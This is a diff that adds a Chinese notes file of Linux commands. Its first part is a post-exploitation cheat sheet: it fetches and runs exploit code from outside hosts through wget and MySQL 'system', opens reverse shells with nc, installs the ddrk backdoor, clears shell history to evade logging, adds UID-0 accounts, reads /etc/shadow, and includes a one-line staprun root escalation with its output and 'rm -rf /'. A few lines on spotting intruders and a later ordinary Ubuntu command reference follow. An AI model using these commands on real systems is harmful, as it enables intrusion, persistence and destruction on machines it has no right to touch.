@@ -1,0 +1,334 @@
+nc -vv -l -p 443  nc端口转发
+wget http://computraining.nl/b.txt 下载编译文件。
+perl b.txt  编译
+cd /etc
+ls -la
+adduser fans 
+passwd 用户 密码
+cat /etc/shadow  查看文件
+chmod 777 文件或目录
+chmod 777 *
+echo fans pass> /var/www/html/soft.php
+cat /etc/ | grep 关键字
+uname -a 版本
+sysctl 内核
+server 服务器
+id  用户组
+cat shadow     看hash
+pwd 目录
+gcc hoolyshit.c -o hoolyshit  编译
+
+useradd fans
+
+grep :x:0: /etc/passwd
+　　只有一行，我再强调一遍，在一个标准的Linux安装里，grep命令应该只返回一行，类似以下：
+　　root:x:0:0:root:/root:/bin/bash
+　　假如在敲入之前的grep命令后你的系统返回的结果不止一行，那可能就有问题了。应该只有一个用户的UID为0，而如果grep命令的返回结果超过一行，那就表示不止一个用户。
+
+你可以通过在shell提示符下敲入history来访问你的历史记录文件。假如你发现自己 正在使用history命令，而它并没有出现在之前使用过的命令列表里，你要看一看你的~/.bash_history 文件。假如这个文件是空的，就执行一个ls -l ~/.bash_history命令。在你执行了上述的命令后你将看到类似以下的输出：
+　　-rw------- 1 jd jd 13829 Oct 10 17:06 /home/jd/.bash_history
+　　又或者，你可能会看到类似以下的输出：
+　　lrwxrwxrwx 1 jd jd 9 Oct 10 19:40 /home/jd/.bash_history -> /dev/null
+　　假如你看到的是第二种，就表明这个 .bash_history 文件已经被重定向到/dev/null。
+
+
+找web路径了，直接执行
+　　mysql>system vi /etc/httpd/conf/httpd.conf;
+　　直接这样就可以找到web的路径，当然，我们的目的并不是找web路径，放webshell进去。我们是要来做其他的事情，比如，下载exp执行， 搞到 root权限，然后装后门虾米的
+　　mysql>system wget http://xxxx.xxx.com/xxxx ; mysql>system chmod +x xxxx; mysql>system ./xxxx;
+　　这样mysql的root此时就成为system的root了，剩下的事情，如果开了ssh,就ssh上去，输入mysql的用户密码，ok,搞定。
+
+
+
+拿webshell不多说
+一。反弹cmdline shell
+直接使用webshell中的反弹回来，本地nc监听nc -vlp 12666
+二。提权为root
+uname -a 查看内核版本 寻找相应的exp提权
+三。安装ddrk后门
+wget http://www.xx.com/ddrk.tgz
+tar zxvf ddrk.tgz
+cd ddrk
+./setup pass port
+ 
+注：
+1.定义历史命令变量，防止被记录操作的命令
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0
+2.添加root权限用户
+useradd -u 0 -g 0 -o 用户
+passwd 用户
+3.反弹回来时发现不是交互的，执行下列命令能够交互式
+python -c 'import pty;pty.spawn("/bin/sh")'
+
+本文转自: 黑客武林(www.hack50.com) 详细出处参考：http://www.hack50.com/stu/sort091/sort0103/74268.html
+
+一句话提权命令：
+
+[b@fuckks~]$ printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTI*****="-C exploit.conf" staprun -u whatever 
+sh-3.2# uname -a
+Linux xlsec 2.6.18-194.el5 #1 SMP Tue Mar 16 21:52:43 EDT 2010 i686 i686 i386 GNU/Linux
+sh-3.2# cat /etc/redhat-release 
+Red Hat Enterprise Linux Server release 5.5 (Tikanga)
+sh-3.2# 
+
+
+linux webshell下信息收集和一些提权常用的命令
+发表于 2011 年 04 月 11 日 由 admin 
+收集。
+
+cat ./../mainfile.php -查看mainfile.php文件内容ls -la – 查看文件列表.
+ifconfig {eth0 etc} – 查看网卡信息.
+ps aux – 查看运行进程.
+gcc in_file -o out_file – 编译c文件.
+cat /etc/passwd – 查看系统账号.
+sudo – 普通用户运行root权限的命令，前提是 /etc/sudoers中有此账户的规则.
+id – 查看当前用户各种id.
+which wget curl w3m lynx – 查看当前可用的下载器
+uname -r -查看内核版本信息 (or) cat /etc/release.
+uname -a – 查看所有信息 (or) cat /etc/issue
+last -30 -最后登录的30个用户.
+useradd – 创建用户.
+usermod – 修改用户属性.
+w -查看当前在线用户.
+locate password.txt – 查找password.txt文件位置
+rm -rf / – 删除系统所有文件，尽管不会完全删除，但系统绝对崩溃，被伤心了才用此命令
+arp -a – 查看同网段内其他主机.
+lsattr -va -查看文件attr属性
+find / -type f -perm -04000 -ls – 查找所有suid权限的文件
+find . -type f -perm -04000 -ls – 查找当前目录suid文件
+find / -type f -perm -02000 -ls – 所有sgid文件.
+find / -perm -2 -ls – 查找所有可写文件和目录.
+find . -perm -2 -ls – 当前目录可写文件和目录.
+find / -type f -name .bash_history – 查找所有 bash history文件.
+netstat -an | grep -i listen – 查看监听端口.
+cut -d: -f1,2,3 /etc/passwd | grep :: – 查看无密码账号
+find /etc/ -type f -perm -o+w 2> /dev/null – 查找etc目录other组可写文件
+cat /proc/version /proc/cpuinfo – 查看cpu信息.
+locate gcc- 查找gcc路径.
+set – 查看环境变量.
+echo $PATH- 查看PATH信息.
+lsmod- 查看内核模块信息.
+mount/df- 查看挂载分区信息.
+rpm -qa- 查看rpm安装信息.
+dmesg- 查看各种硬件信息
+cat /etc/syslog.conf – 查看syslog日志配置信息.
+uptime – 查看主机运行时间.
+cat /proc/meminfo -查看内存信息.
+find / -type f -perm -4 -print 2> /dev/null- 查找可读文件.
+find / -type f -perm -2 -print 2> /dev/null – 查找可写文件.
+chmod ### $folder – 更改目录权限.
+ls -l -b – 查看文件详细信息
+
+
+系统信息
+===========================================================================
+系统
+    # uname -a # 查看内核/操作系统/CPU信息
+    # head -n 1 /etc/issue # 查看操作系统版本
+    # cat /proc/cpuinfo # 查看CPU信息
+    # hostname # 查看计算机名
+    # lspci -tv # 列出所有PCI设备
+    # lsusb -tv # 列出所有USB设备
+    # lsmod # 列出加载的内核模块
+    # env # 查看环境变量
+    资源
+    # free -m # 查看内存使用量和交换区使用量
+    # df -h # 查看各分区使用情况
+    # du -sh # 查看指定目录的大小
+    # grep MemTotal /proc/meminfo # 查看内存总量
+    # grep MemFree /proc/meminfo # 查看空闲内存量
+    # uptime # 查看系统运行时间、用户数、负载
+    # cat /proc/loadavg # 查看系统负载
+    磁盘和分区
+    # mount | column -t # 查看挂接的分区状态
+    # fdisk -l # 查看所有分区
+    # swapon -s # 查看所有交换分区
+    # hdparm -i /dev/hda # 查看磁盘参数(仅适用于IDE设备)
+    # dmesg | grep IDE # 查看启动时IDE设备检测状况
+    网络
+    # ifconfig # 查看所有网络接口的属性
+    # iptables -L # 查看防火墙设置
+    # route -n # 查看路由表
+    # netstat -lntp # 查看所有监听端口
+    # netstat -antp # 查看所有已经建立的连接
+    # netstat -s # 查看网络统计信息
+    进程
+    # ps -ef # 查看所有进程
+    # top # 实时显示进程状态
+    用户
+    # w # 查看活动用户
+    # id # 查看指定用户信息
+    # last # 查看用户登录日志
+    # cut -d: -f1 /etc/passwd # 查看系统所有用户
+    # cut -d: -f1 /etc/group # 查看系统所有组
+    # crontab -l # 查看当前用户的计划任务
+    服务
+    # chkconfig --list # 列出所有系统服务
+    # chkconfig --list | grep on # 列出所有启动的系统服务
+    程序
+    # rpm -qa # 查看所有安装的软件包 
+
+
+
+
+
+
+最近再一次拾起了Ubuntu，为了更好的玩儿转Linux，专门到网上搜到的这些常用的终端命令，根据命令使用类别的不同分为了9个大类，都在下面一一列举了出来，个人觉得还是很有用的，在以后的时间里，小弟会随时更新自己对于Ubuntu的使用心得一.
+
+
+   文件目录类
+    1.建立目录：mkdir 目录名
+    2.删除空目录：rmdir 目录名
+    3.无条件删除子目录： rm -rf 目录名
+    4.改变当前目录：cd 目录名 (进入用户home目录：cd ~;进入上一级目录：cd -)
+    5.查看自己所在目录：pwd
+    6.查看当前目录大小：du
+    7.显示目录文件列表：ls -l (-a：增加显示隐含目录)
+    其中：蓝：目录;绿：可执行文件;红：压缩文件;浅蓝：链接文件;灰：其他文件;红底白字：错误的链接文件
+    8.浏览文件：more 文件名.txt;less 文件名.txt
+    9.复制文件： cp 源文件 目标文件 (-r：包含目录)
+    10.查找文件：(1)find (2)locate 命令名
+    11.链接：(1)建立hard链接：ln 来源文件 链接文件(-d：创建目录链接）；(2)建立符号链接：ln -s 来源文件 链接文件
+
+    二.驱动挂载类
+    1.检查硬盘使用情况：df -T -h
+    2.检查磁盘分区：fdisk -l
+    3.挂载软硬光区：mount -t /dev/fdx|hdax /mnt/目录名
+    其中：：modos--FAT16;vfat--FAT32;ntfs--NTFS;光驱--iso9660
+    支持中文名：mount -o iocharset=x /dev/hdax /mnt/目录名(其中：x=cp936或
+    挂载光驱：mount -t auto /dev/cdrom /mnt/cdrom
+    挂载ISO文件：mount -t iso9660 -o loop xxx.iso /path
+    4.解除挂载：umount /mnt/目录名
+    解除所有挂载：umount -a
+    5.建立文件系统：mkfs -t /dev/hdxx。其中：ftype：ext2、ext3、swap等
+
+    三.程序安装类
+    1.RPM包安装：(1)安装 rpm -ivh somesoft.rpm
+    (2)反安装 rpm -e somefost.rpm
+    (3)查询 rpm -q somefost 或 rpm -qpi somefost.rpm(其中：p未安装;i包含的信息)
+    (4)查询安装后位置：rpm -ql somefost.rpm
+    (5)升级安装：rpm -Uvh somesoft.rpm
+    (6)强制安装：rpm -ivh --nodeps somesoft.rpm 或 rpm -ivh --nodeps --force somesoft.rpm
+
+    2.源代码包安装：
+    查阅README
+    基本用法 (1)配置：解压目录下 ./configure
+    (2)编译：解压目录下 make
+    (3)安装：解压目录下 make install
+    3.src.rpm的安装
+    需要用到rpmbuild命令加上--rebuild参数。如 rpmbuild --rebuild ***.src.rpm。然后在/usr/src/下找
+    3.FC3下iso程序安装：system-config-packages --isodir=iso所在目录
+    RH下iso程序安装：redhat-config-packages --isodir=iso所在目录
+
+    四.压缩解压类
+    1.tar.gz类：(1)解压：tar -xvzf 文件.tar.gz；(2)tar.gz解至tar：gzip -d 文件.tar.gz(2)压缩：gzip 待压缩文件
+    2.tar未压缩类：(1)解包：tar -xvf 文件.tar；(2)打包：tar -cvf 文件.tar 文件列表
+    3.zip类：(1)解压：unzip 文件.zip -d dir；(2)压缩：zip zipfile 待压缩文件列表
+    4.bz2类：(1)解压：bunzip2 文件.bz2或bzip2 -d 文件.bz2；(2)压缩：bzip2 待压缩文件
+    5.z类：(1)解压：uncompress 文件.z；(2)压缩：compress 文件
+
+    五.进程控制类
+    1.列出当前进程ID：ps -auxw
+    2.终止进程：(1)终止单一进程：kill 进程ID号
+    (2)终止该程序所有进程：Killall 程序名
+    (3)终止X-Window程序：xkill
+    3.查看资源占用情况：(1)top (2)free (3)dmesg
+    4.查看环境变量值：env
+    5.重启：(1)reboot (2)Ctrl Alt Del (3)init 6
+    6.关机：(1)shutdown -h now (2)halt (3)init 0
+    7.切换桌面：switchdesk gnome|KDE|...
+
+    六.程序运行类
+    1.查询命令：whereis 命令名
+    2.后台运行X-Window程序：程序名&
+    3.强行退出X-Window程序：Ctrl Alt Backspace
+    4.查看帮助：
+    (1)简明帮助：命令名 --help | less
+    (2)更多帮助：man 命令名
+    (3)info 命令名
+    (4)help 命令名
+    5.查看系统路径：echo $PATH
+    6.查看当前shell堆栈：echo $SHLVL
+    7.< / >：输入/输出重定向;|：管道左的输入是管道右输入
+
+    六.用户帐号类
+    1.增加用户帐号：(1)用 户 名：adduser 用户帐号名
+    (2)设置密码： passwd 用户帐号名
+    2.删除用户帐号：userdel 用户帐号名
+    3.增加用户组：groupadd 用户组名
+    4.删除用户组：groupdel 用户组名
+    5.暂时终止用户帐号：passwd -l 用户帐号名
+    6.恢复被终止帐号：passwd -u 用户帐号名
+    7.权限设定
+    (1)chmod -a|u|g|o |-|=r|w|x 文件/目录名
+    其中：a--所有用户(all);u--本用户(user);g--用户组(group);o--其他用户(other users)
+    --增加权限;---删除权限;=--设置权限
+    文件：r--只读权限(read);w--写权限(write);x--执行权限(execute)
+    目录：r--允许列目录下文件和子目录;w--允许生成和删除目录下文件;x--允许访问该目录
+    (2)chmod xxx 文件/目录名
+    其中：execute=1;write=2;read=4
+    x取值：0--没有任何权限(常用);1--只能执行(不常见);2--只能写(不常见);3--只能写和执行(不常见);4--只读(常见);5--只读和执行(常见);6--读和写(常见);7--读.写和执行
+
+    七.vi编辑类
+    1.进入后为命令模式：(1)插入i；(2)打开0；(3)修改c；(4)取代r；(5)替换s
+    2.经(1)后进入全屏幕编辑模式。
+    3.命令模式-->编辑模式(a/i)；编辑模式-->命令模式(Esc)；命令模式-->末行模式(：)。
+    4.：w/w newfile保存
+    5.：q/q!退出iv；：wq保存退出
+
+    八.网络服务
+    1.显示网络接口参数：ifconfig
+    2.显示系统邮件：mail
+    3.启动/终止web服务：httpd -k start|stop|restart
+    4.查看网络状况：(1)联机状况：ping xxx.xxx.xxx.xxx；
+    (2)显示网络状况：netstat ，其中：options：-a==所有sockets；-l==包含网络设备；-n==数字IP；
+    -o==其他信息；-r==路由表；-t==只列TCP sockets；-u==只列UDP sockets；-w==只列raw sockets；
+    -x==只列Unix Domain sockets
+
+    九.其他类
+    1.显示显卡3D信息：glxinfo和glxgears
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
